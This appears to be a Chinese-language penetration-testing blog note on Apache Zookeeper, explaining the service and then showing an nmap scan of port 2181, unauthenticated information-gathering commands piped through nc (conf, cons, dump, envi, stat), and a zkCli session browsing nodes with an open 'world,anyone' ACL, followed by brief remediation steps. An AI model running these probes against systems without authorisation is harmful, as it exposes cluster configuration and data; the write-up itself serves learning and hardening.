---
title: Zookeeper
category:
- [Kali, Exploit]
tags:
  - null
date: 2020-12-04 20:23:24
top:
updated:
---

`Zookeeper`是一个分布式协调服务的开源框架，主要解决分布式集群中应用系统的一致性问题（避免同时操作同一数据造成脏读问题），本质上是一个`分布式的小文件存储系统`。

Zookeeper=`文件系统`+`监听通知机制`

Zookeeper提供的常见服务：
- `命令服务` 按名称标识集群中的节点，类似于DNS
- `配置管理` 加入节点的最近的和最新的系统配置信息
- `集群管理` 实时在集群和节点状态加入/离开节点
- `选举算法` 选举一个节点作为协调目的的leader
- `锁定和同步服务` 在修改数据的同时锁定数据
- `高度可靠的数据注册表` 即使在多个节点关闭时也可获得数据


## 信息收集
```zsh
sudo nmap 10.196.20.52 -Pn -T4 -sS -p 2181
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-06 15:33 CST
Nmap scan report for 10.196.20.52
Host is up (0.13s latency).

PORT     STATE SERVICE
2181/tcp open  eforward

Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
```


## Zookeeper未授权访问 CVE-2014-085

### 获取服务信息
1. conf命令-获取配置信息  
   `echo conf | nc 10.196.20.52 2181 `
2. cons命令-获取会话详细信息  
	`echo cons | nc 10.196.20.52 2181 | more`
3. dump命令-输出未处理的会话和leader节点  
	`echo dump | nc 10.196.20.52 2181 | more`
4. envi命令-输出服务器详细信息  
	`echo envi | nc 10.196.20.52 2181 `
5. stat命令-输出统计信息  
	`echo stat | nc 10.196.20.52 2181`

![envi
](https://img-blog.csdnimg.cn/20200511110602545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fhcm9uX01pbGxlcg==,size_16,color_FFFFFF,t_70)### zkCli客户端连接操作
```
zkCli -server 10.196.20.51:2181                                                                          
Connecting to 10.196.20.51:2181
Welcome to ZooKeeper!
JLine support is enabled
[zk: 10.196.20.51:2181(CONNECTING) 0]
WATCHER::

WatchedEvent state:SyncConnected type:None path:null

[zk: 10.196.20.51:2181(CONNECTED) 0] ls /
[admin, brokers, cluster, config, consumers, controller, controller_epoch, isr_change_notification, latest_producer_id_block, log_dir_event_notification, zookeeper]
[zk: 10.196.20.51:2181(CONNECTED) 1] get /controller
{"version":1,"brokerid":3,"timestamp":"1604393865608"}
[zk: 10.196.20.51:2181(CONNECTED) 2] get
get                    getAcl                 getAllChildrenNumber   getEphemerals
[zk: 10.196.20.51:2181(CONNECTED) 2] getAcl /
'world,'anyone
: cdrwa
[zk: 10.196.20.51:2181(CONNECTED) 3]
```

### 漏洞修复
1. 设置防火墙策略限制 IP 访问
1. 不要将 zookeeper 暴露在外网
1. 设置用户认证和 ACL
